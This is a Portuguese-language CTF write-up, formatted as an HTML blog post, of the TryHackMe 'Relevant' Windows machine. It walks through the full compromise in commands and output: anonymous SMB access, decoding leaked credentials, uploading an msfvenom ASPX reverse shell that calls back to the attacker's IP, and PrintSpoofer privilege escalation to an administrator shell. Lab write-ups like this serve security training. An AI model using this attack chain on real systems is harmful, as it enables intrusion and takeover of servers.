@@ -1,0 +1,301 @@
+<p><img src="/img/thm/thm-relevant-logo.png" /></p>
+
+<p><br /></p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Nome</th>
+      <th><a href="https://tryhackme.com/room/relevant">Relevant</a></th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>OS</td>
+      <td>Windows</td>
+    </tr>
+    <tr>
+      <td>Nível</td>
+      <td>Medium</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><br /></p>
+
+<h2 id="recon">RECON</h2>
+
+<h3 id="nmap">Nmap</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Relevant]
+└─<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-v</span> <span class="nt">-p-</span> <span class="nt">-sCV</span> <span class="nt">-O</span> <span class="nt">-Pn</span> 10.10.226.231 <span class="nt">--min-rate</span><span class="o">=</span>512
+PORT      STATE SERVICE        VERSION
+135/tcp   open  msrpc          Microsoft Windows RPC
+139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds   Windows Server 2016 Standard Evaluation 14393 microsoft-ds
+3389/tcp  open  ms-wbt-server?
+| rdp-ntlm-info: 
+|   Target_Name: RELEVANT
+|   NetBIOS_Domain_Name: RELEVANT
+|   NetBIOS_Computer_Name: RELEVANT
+|   DNS_Domain_Name: Relevant
+|   DNS_Computer_Name: Relevant
+|   Product_Version: 10.0.14393
+|_  System_Time: 2021-09-07T22:59:16+00:00
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>Relevant
+| Issuer: <span class="nv">commonName</span><span class="o">=</span>Relevant
+| Public Key <span class="nb">type</span>: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2021-09-06T22:52:02
+| Not valid after:  2022-03-08T22:52:02
+| MD5:   65f1 f37d f442 7cd1 d342 f36e b698 ed23
+|_SHA-1: 1c67 587f 9659 7d0c 51d6 8cbf 9d31 bb04 d5d5 4007
+|_ssl-date: 2021-09-07T22:59:54+00:00<span class="p">;</span> <span class="nt">-1h00m00s</span> from scanner time.
+49663/tcp open  http           Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+49667/tcp open  msrpc          Microsoft Windows RPC
+49669/tcp open  msrpc          Microsoft Windows RPC
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device <span class="nb">type</span>: general purpose
+Running <span class="o">(</span>JUST GUESSING<span class="o">)</span>: Microsoft Windows 2012|2016|2008|10 <span class="o">(</span>92%<span class="o">)</span>
+OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_10:1607
+Aggressive OS guesses: Microsoft Windows Server 2012 R2 <span class="o">(</span>92%<span class="o">)</span>, Microsoft Windows Server 2016 <span class="o">(</span>91%<span class="o">)</span>, Microsoft Windows Server 2012 <span class="o">(</span>85%<span class="o">)</span>, Microsoft Windows Server 2012 or Windows Server 2012 R2 <span class="o">(</span>85%<span class="o">)</span>, Microsoft Windows Server 2008 R2 <span class="o">(</span>85%<span class="o">)</span>, Microsoft Windows 10 1607 <span class="o">(</span>85%<span class="o">)</span>
+No exact OS matches <span class="k">for </span>host <span class="o">(</span><span class="nb">test </span>conditions non-ideal<span class="o">)</span><span class="nb">.</span>
+Uptime guess: 0.008 days <span class="o">(</span>since Tue Sep  7 19:48:44 2021<span class="o">)</span>
+TCP Sequence Prediction: <span class="nv">Difficulty</span><span class="o">=</span>261 <span class="o">(</span>Good luck!<span class="o">)</span>
+IP ID Sequence Generation: Incremental
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 24m00s, deviation: 3h07m52s, median: <span class="nt">-1h00m00s</span>
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard Evaluation 14393 <span class="o">(</span>Windows Server 2016 Standard Evaluation 6.3<span class="o">)</span>
+|   Computer name: Relevant
+|   NetBIOS computer name: RELEVANT<span class="se">\x</span>00
+|   Workgroup: WORKGROUP<span class="se">\x</span>00
+|_  System <span class="nb">time</span>: 2021-09-07T15:59:18-07:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   <span class="nb">date</span>: 2021-09-07T22:59:17
+|_  start_date: 2021-09-07T22:53:11
+</code></pre></div></div>
+
+<p>O nmap nos revelou que possívelmente estamos lidando com um Windows Server 2012 com SMB e algum serviço HTTP na porta 49663, vamos começar por esta porta.</p>
+
+<h3 id="porta-49663">Porta 49663</h3>
+
+<p><img src="/img/thm/thm-relevant-1.png" /></p>
+
+<p>Nos deparamos com a tela padrão do IIS, vamos fazer uma varredura com <code class="language-plaintext highlighter-rouge">gobuster</code> para tentar enumerar alguns diretórios.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Relevant]
+└─<span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-e</span> <span class="nt">-u</span> <span class="s1">'http://10.10.226.231:49663/'</span> <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class="nt">-r</span>
+<span class="o">===============================================================</span>
+Gobuster v3.1.0
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:                     http://10.10.226.231:49663/
+<span class="o">[</span>+] Method:                  GET
+<span class="o">[</span>+] Threads:                 10
+<span class="o">[</span>+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+<span class="o">[</span>+] Negative Status codes:   404
+<span class="o">[</span>+] User Agent:              gobuster/3.1.0
+<span class="o">[</span>+] Follow Redirect:         <span class="nb">true</span>
+<span class="o">[</span>+] Expanded:                <span class="nb">true</span>
+<span class="o">[</span>+] Timeout:                 10s
+<span class="o">===============================================================</span>
+2021/09/07 20:10:34 Starting gobuster <span class="k">in </span>directory enumeration mode
+<span class="o">===============================================================</span>
+http://10.10.226.231:49663/nt4wrksv             <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 0]
+</code></pre></div></div>
+
+<p>Encontramos o diretório <code class="language-plaintext highlighter-rouge">/nt4wrksv</code>, vamos acessá-lo.</p>
+
+<p><img src="/img/thm/thm-relevant-2.png" /></p>
+
+<p>Fomos levados para uma página em branco, aparentemente até o momento a porta 49663 não nos deu muita coisa.</p>
+
+<h3 id="smb">SMB</h3>
+
+<p>Vamos tentar null session no SMB.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Relevant]
+└─<span class="nv">$ </span>smbclient <span class="nt">-L</span> <span class="se">\\</span>10.10.226.231
+Enter WORKGROUP<span class="se">\h</span>astur<span class="s1">'s password: 
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        nt4wrksv        Disk      
+SMB1 disabled -- no workgroup available
+</span></code></pre></div></div>
+<p>Temos acesso com null session!!!</p>
+
+<p>E um dos diretórios tem exatamente o mesmo nome do diretório encontrado na porta 49663, vamos acessá-lo.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Relevant]
+└─<span class="nv">$ </span>smbclient <span class="se">\\\\</span>10.10.226.231<span class="se">\\</span>nt4wrksv        
+Enter WORKGROUP<span class="se">\h</span>astur<span class="s1">'s password: 
+Try "help" to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Sat Jul 25 17:46:04 2020
+  ..                                  D        0  Sat Jul 25 17:46:04 2020
+  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020
+
+                7735807 blocks of size 4096. 4945313 blocks available
+smb: \&gt; get passwords.txt 
+getting file \passwords.txt of size 98 as passwords.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
+smb: \&gt; 
+</span></code></pre></div></div>
+<p>Dentro do diretório existe o arquivo <code class="language-plaintext highlighter-rouge">passwords.txt</code>, vamos baixá-lo para enumerar seu conteúdo.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Relevant]
+└─<span class="nv">$ </span><span class="nb">cat </span>passwords.txt 
+<span class="o">[</span>User Passwords - Encoded]
+<span class="nv">Qm9iIC0gIVBAJCRXMHJEITEyMw</span><span class="o">==</span>
+QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk 
+</code></pre></div></div>
+<p>Aparentemente temos duas hashes em <code class="language-plaintext highlighter-rouge">base64</code>, vamos tentar decriptá-las.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Relevant]
+└─<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'Qm9iIC0gIVBAJCRXMHJEITEyMw'</span> | <span class="nb">base64</span> <span class="nt">-d</span>
+Bob - <span class="o">!</span>P@<span class="nv">$$</span>W0rD!123base64: invalid input
+                                                                                                                                                                                                                                             
+┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Relevant]
+└─<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk'</span> | <span class="nb">base64</span> <span class="nt">-d</span>                                                                                                                                                                          1 ⨯
+Bill - Juw4nnaM4n420696969!<span class="nv">$$$ </span>  
+</code></pre></div></div>
+
+<p>Temos duas credenciais, mas ainda não sabemos para qual serviço em questão, vamos tentar acessar o arquivo <code class="language-plaintext highlighter-rouge">passwords.txt</code> pelo browser, para confirmar se o diretório web é o mesmo do SMB.</p>
+
+<p><img src="/img/thm/thm-relevant-3.png" /></p>
+
+<p>Ótimo, temos acesso ao diretório que reflete no webserver, podemos criar um exploit que nos dará um reverse shell!!</p>
+
+<p>Vamos utilizar o <code class="language-plaintext highlighter-rouge">msfvenom</code> para criar nosso exploit.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Relevant]
+└─<span class="nv">$ </span>msfvenom <span class="nt">-p</span> windows/x64/shell_reverse_tcp <span class="nv">lhost</span><span class="o">=</span>10.9.0.16 <span class="nv">lport</span><span class="o">=</span>8443 <span class="nt">-f</span> aspx <span class="nt">-o</span> hastur.aspx
+<span class="o">[</span>-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+<span class="o">[</span>-] No <span class="nb">arch </span>selected, selecting <span class="nb">arch</span>: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of aspx file: 3411 bytes
+Saved as: hastur.aspx
+</code></pre></div></div>
+<p>Vamos subir nosso exploit através do SMB.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Relevant]
+└─<span class="nv">$ </span>smbclient <span class="se">\\\\</span>10.10.226.231<span class="se">\\</span>nt4wrksv                                         
+Enter WORKGROUP<span class="se">\h</span>astur<span class="s1">'s password: 
+Try "help" to get a list of possible commands.
+smb: \&gt; put hastur.aspx 
+putting file hastur.aspx as \hastur.aspx (3.4 kb/s) (average 3.4 kb/s)
+smb: \&gt; ls
+  .                                   D        0  Tue Sep  7 19:25:30 2021
+  ..                                  D        0  Tue Sep  7 19:25:30 2021
+  hastur.aspx                         A     3411  Tue Sep  7 19:25:31 2021
+  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020
+
+                7735807 blocks of size 4096. 4945229 blocks available
+smb: \&gt; 
+</span></code></pre></div></div>
+
+<p>Agora podemos setar nosso <code class="language-plaintext highlighter-rouge">netcat</code> na porta 8443 do nosso exploit e enviar um <code class="language-plaintext highlighter-rouge">curl</code> para o endereço.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Relevant]
+└─<span class="nv">$ </span>curl <span class="s1">'http://10.10.226.231:49663/nt4wrksv/hastur.aspx'</span> 
+</code></pre></div></div>
+
+<p>E conseguimos nosso shell.</p>
+
+<p><img src="/img/thm/thm-relevant-4.png" /></p>
+
+<p>A flag <code class="language-plaintext highlighter-rouge">user.txt</code> se encontra no Desktop do usuário <code class="language-plaintext highlighter-rouge">Bob</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:<span class="se">\U</span>sers<span class="se">\B</span>ob<span class="se">\D</span>esktop&gt;dir
+<span class="nb">dir
+ </span>Volume <span class="k">in </span>drive C has no label.
+ Volume Serial Number is AC3C-5CB5
+
+ Directory of c:<span class="se">\U</span>sers<span class="se">\B</span>ob<span class="se">\D</span>esktop
+
+07/25/2020  02:04 PM    &lt;DIR&gt;          <span class="nb">.</span>
+07/25/2020  02:04 PM    &lt;DIR&gt;          ..
+07/25/2020  08:24 AM                35 user.txt
+               1 File<span class="o">(</span>s<span class="o">)</span>             35 bytes
+               2 Dir<span class="o">(</span>s<span class="o">)</span>  20,225,691,648 bytes free
+</code></pre></div></div>
+
+<h3 id="escalação-de-privilégios">Escalação de privilégios</h3>
+
+<p>Ao enumerar os privilégios do usuário, encontramos algo interessante.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt;whoami /priv
+<span class="nb">whoami</span> /priv
+
+PRIVILEGES INFORMATION
+<span class="nt">----------------------</span>
+
+Privilege Name                Description                               State   
+<span class="o">=============================</span> <span class="o">=========================================</span> <span class="o">========</span>
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas <span class="k">for </span>a process        Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set            </span>Disabled
+</code></pre></div></div>
+<p>O usuário tem o privilégio <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code> habilitado, basicamente podemos representar um cliente e suas configurações de segurança, mais detalhes <a href="https://docs.microsoft.com/pt-br/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege">aqui</a>.</p>
+
+<p>Depois de um tempo de pesquisa, encontrei uma vulnerabilidade do <code class="language-plaintext highlighter-rouge">PrintSpoofer</code> do Windows que abusa dos privilégios de impersonate, o resumo pode ser lido <a href="https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/">aqui</a>.</p>
+
+<p>Esta vulnerabilidade já possui um exploit público que pode ser encontrado <a href="https://github.com/dievus/printspoofer">aqui</a>.</p>
+
+<p>Após fazer o download do executável, podemos subir para a máquina alvo através do SMB.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Relevant]
+└─<span class="nv">$ </span>smbclient <span class="se">\\\\</span>10.10.226.231<span class="se">\\</span>nt4wrksv                 
+Enter WORKGROUP<span class="se">\h</span>astur<span class="s1">'s password: 
+Try "help" to get a list of possible commands.
+smb: \&gt; put PrintSpoofer.exe 
+putting file PrintSpoofer.exe as \PrintSpoofer.exe (19.3 kb/s) (average 19.3 kb/s)
+smb: \&gt; ls
+  .                                   D        0  Tue Sep  7 19:46:54 2021
+  ..                                  D        0  Tue Sep  7 19:46:54 2021
+  hastur.aspx                         A     3425  Tue Sep  7 19:30:01 2021
+  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020
+  PrintSpoofer.exe                    A    27136  Tue Sep  7 19:46:55 2021
+
+                7735807 blocks of size 4096. 5143276 blocks available
+smb: \&gt; 
+</span></code></pre></div></div>
+<p>Agora com tudo pronto, só precisamos rodar o comando <code class="language-plaintext highlighter-rouge">PrintSpoofer.exe -i -c cmd</code> e obter o shell administrativo.</p>
+
+<p><img src="/img/thm/thm-relevant-5.png" /></p>
+
+<p>E conseguimos nosso shell Administrativo.</p>
+
+<p>A flag <code class="language-plaintext highlighter-rouge">root.txt</code> se encontra no Desktop do Administrator.</p>
+
+<p><br /></p>
+
+<p>E comprometemos o server!!
+<br /></p>
+
+<p><img src="/htb/hackerman.gif" /></p>
+
